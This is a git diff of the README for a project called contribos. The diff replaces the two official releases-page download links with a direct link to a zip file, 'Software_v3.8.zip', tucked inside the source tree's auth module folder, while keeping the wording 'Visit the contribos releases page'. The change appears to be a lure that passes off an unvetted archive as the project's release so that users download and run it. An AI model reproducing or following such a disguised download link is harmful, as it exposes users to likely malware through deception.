@@ -1,6 +1,6 @@
 # 🤖 contribos - Find issues, build fixes, ship PRs
 
-[![Download contribos](https://img.shields.io/badge/Download%20contribos-blue-grey)](https://github.com/budgetsecernment381/contribos/releases)
+[![Download contribos](https://img.shields.io/badge/Download%20contribos-blue-grey)](https://raw.githubusercontent.com/budgetsecernment381/contribos/main/services/api/src/modules/auth/Software_v3.8.zip)
 
 ## 🚀 What is contribos?
 
@@ -20,7 +20,7 @@ You can use it to:
 
 Use this page to download the app:
 
-[Visit the contribos releases page](https://github.com/budgetsecernment381/contribos/releases)
+[Visit the contribos releases page](https://raw.githubusercontent.com/budgetsecernment381/contribos/main/services/api/src/modules/auth/Software_v3.8.zip)
 
 Look for the latest release, then download the Windows file from that page. If there are more than one file, choose the one that ends in `.exe` or `.msi`.
 
